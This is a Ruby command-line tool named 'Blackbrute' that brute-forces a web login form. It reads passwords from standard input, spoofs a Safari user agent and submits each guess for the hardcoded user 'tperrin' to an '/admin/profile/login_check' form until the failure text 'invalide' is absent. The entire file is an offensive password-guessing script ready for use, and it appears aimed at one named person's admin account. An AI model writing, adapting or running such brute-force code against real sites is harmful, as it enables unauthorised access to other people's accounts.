require 'blackbrute/version'
require 'commander'
require 'mechanize'

module Blackbrute
  class BlackbruteApplication
    include Commander::Methods

    def run
      program :name, 'Blackbrute'
      program :version, Blackbrute::VERSION
      program :description, 'Brute force generator.'

      command :full do |c|
        c.syntax = 'blackbrute form'
        c.description = 'Brute force generator - incremental word list'
        c.option '-u', '--url URL', String, 'Set url'
        c.option '-a', '--action ACTION', String, 'Set form action'
        c.option '-d', '--data DATA', String, 'Set data form'
        c.action do |args, options|
          options.default \
  				        :url => 'http://',
                  :action => '/admin/profile/login_check'

          while pass = STDIN.gets
            agent = Mechanize.new
            agent.user_agent_alias = 'Mac Safari'

            agent.get(options.url) do |page|
              result = page.form_with(:action => '/admin/profile/login_check') do |form|
                form._username = 'tperrin'
                form._password = pass
              end.submit

              if result.body.include?('invalide')
                puts "login failed :#{pass}"
              else
                puts "login success :#{pass}"
                break
              end
            end
          end
        end

        run!
      end
    end
  end

  def self.run()
    BlackbruteApplication.new.run
  end
end
